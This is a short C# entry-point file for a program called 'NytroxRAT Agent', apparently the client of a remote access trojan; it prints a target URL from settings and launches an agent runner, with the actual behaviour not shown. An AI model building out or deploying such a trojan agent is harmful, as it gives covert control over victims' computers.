using NytroxRAT.Agent;

Console.Title = "NytroxRAT Agent";
Console.WriteLine("=== NytroxRAT Agent ===");
Console.WriteLine($">> Target: {Settings.GetUrl()}");

using var cts = new CancellationTokenSource();
Console.CancelKeyPress += (_, _) => cts.Cancel();

await new AgentRunner().RunAsync(cts.Token);
